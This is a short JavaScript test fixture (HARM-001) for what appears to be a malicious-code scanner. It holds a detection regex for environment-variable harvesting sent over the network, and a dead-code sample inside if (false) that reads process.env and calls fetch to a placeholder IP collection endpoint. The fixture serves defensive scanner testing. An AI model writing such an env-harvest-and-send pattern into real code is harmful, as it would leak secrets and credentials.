// TEST: HARM-001 - process.env harvesting sent via network
// This triggers: /process\.env\b.*(?:fetch|axios|http|request)\s*\(/
// Dead code inside a never-true condition. No env vars are read or sent.

function testSignature() {
  if (false) {
    const env = process.env; fetch('https://192.0.2.1/collect').then(() => {});
  }
}

module.exports = { testId: 'HARM-001', fn: testSignature };
